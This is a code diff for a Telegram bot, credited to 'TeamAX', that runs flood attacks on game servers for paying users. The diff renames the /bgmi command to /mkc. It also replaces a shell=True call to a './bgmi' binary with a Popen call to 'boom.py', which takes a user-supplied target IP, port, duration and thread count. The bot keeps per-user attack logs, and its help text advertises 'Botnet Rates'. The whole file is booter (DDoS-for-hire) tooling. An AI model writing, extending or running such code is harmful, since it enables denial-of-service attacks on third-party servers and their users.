@@ -3,6 +3,7 @@
 
 import telebot
 import subprocess
+import threading
 import requests
 import datetime
 import os
@@ -203,50 +204,63 @@ def show_user_id(message):
     response = f"Your ID: {user_id}"
     bot.reply_to(message, response)
 
-# Function to handle the reply when free users run the /bgmi command
+
+
+# Function to handle the reply when free users run the /mkc command
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy TeamAX @TeamAX_03"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: mkc\nBy TeamAX @TeamAX_03"
     bot.reply_to(message, response)
 
-# Dictionary to store the last time each user ran the /bgmi command
-bgmi_cooldown = {}
+# Dictionary to store the last time each user ran the /mkc command
+mkc_cooldown = {}
 
-COOLDOWN_TIME =0
+COOLDOWN_TIME = 0
 
-# Handler for /bgmi command
-@bot.message_handler(commands=['bgmi'])
-def handle_bgmi(message):
+# Handler for /mkc command
+@bot.message_handler(commands=['mkc'])
+def handle_mkc(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 1:
-                response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
+            if user_id in mkc_cooldown and (datetime.datetime.now() - mkc_cooldown[user_id]).seconds < 1:
+                response = "You Are On Cooldown. Please Wait 5min Before Running The /mkc Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
-            bgmi_cooldown[user_id] = datetime.datetime.now()
+            mkc_cooldown[user_id] = datetime.datetime.now()
         
         command = message.text.split()
         if len(command) == 4:  # Updated to accept target, time, and port
             target = command[1]
-            port = int(command[2])  # Convert time to integer
-            time = int(command[3])  # Convert port to integer
+            port = int(command[2])  # Convert port to integer
+            time = int(command[3])  # Convert time to integer
             if time > 5000:
                 response = "Error: Time interval must be less than 80."
             else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
+                record_command_logs(user_id, '/mkc', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 500"
-                subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
+                
+                # Construct the command to run the attack script
+                attack_command = [
+                    "python3",
+                    "boom.py",
+                    "--ip", target,
+                    "--port", str(port),
+                    "--times", "50000000",
+                    "--threads", "6",
+                    "--duration", str(time)  # Pass the duration to the script
+                ]
+                subprocess.Popen(attack_command)
+                
+                response = f"mkc Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
-            response = "Usage :- /bgmi <target> <port> <time>\nBy TeamAX @TeamAX_03"  # Updated command syntax
+            response = "Usage :- /mkc <target> <port> <time>\nBy TeamAX @TeamAX_03"  # Updated command syntax
     else:
         response = "You Are Not Authorized To Use This Command.\nBy Team AX @TeamAX_03"
 
@@ -254,7 +268,7 @@ def handle_bgmi(message):
 
 
 
-# Add /mylogs command to display logs recorded for bgmi and website commands
+# Add /mylogs command to display logs recorded for mkc and website commands
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
     user_id = str(message.chat.id)
@@ -278,7 +292,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text = '''Available commands:
- /bgmi : Method For Bgmi Servers. 
+ /mkc : Method For mkc Servers. 
  /rules : Please Check Before Use !!.
  /mylogs : To Check Your Recents Attacks.
  /plan : Checkout Our Botnet Rates.
